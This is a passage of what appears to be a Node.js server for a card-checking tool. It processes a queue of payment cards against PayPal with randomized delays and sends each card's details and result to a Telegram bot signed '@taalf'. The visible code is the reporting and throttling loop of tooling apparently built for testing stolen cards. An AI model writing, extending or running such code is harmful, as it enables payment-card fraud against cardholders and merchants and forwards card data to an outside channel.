━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf`;
      } else {
        telegramText = `🔔 <b>Card Result</b>
━━━━━━━━━━━━━━━━━
<b>Status:</b> ${message}
<b>Card:</b> ${cardInfo}
<b>Type:</b> ${msgType}
<b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━
<b>BY:</b> @taalf`;
      }
      
      await axios.post(`https://api.telegram.org/bot${item.botToken}/sendMessage`, {
        chat_id: item.chatId,
        text: telegramText,
        parse_mode: 'HTML'
      });
    } catch (e) {
      console.log('Telegram error:', e.message);
    }
  }
  
  // Continue with next card after delay (6-10 seconds like Python)
  const delay = 6000 + Math.random() * 4000;
  setTimeout(processPaypalQueueEnhanced, delay);
}

// Fallback route
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
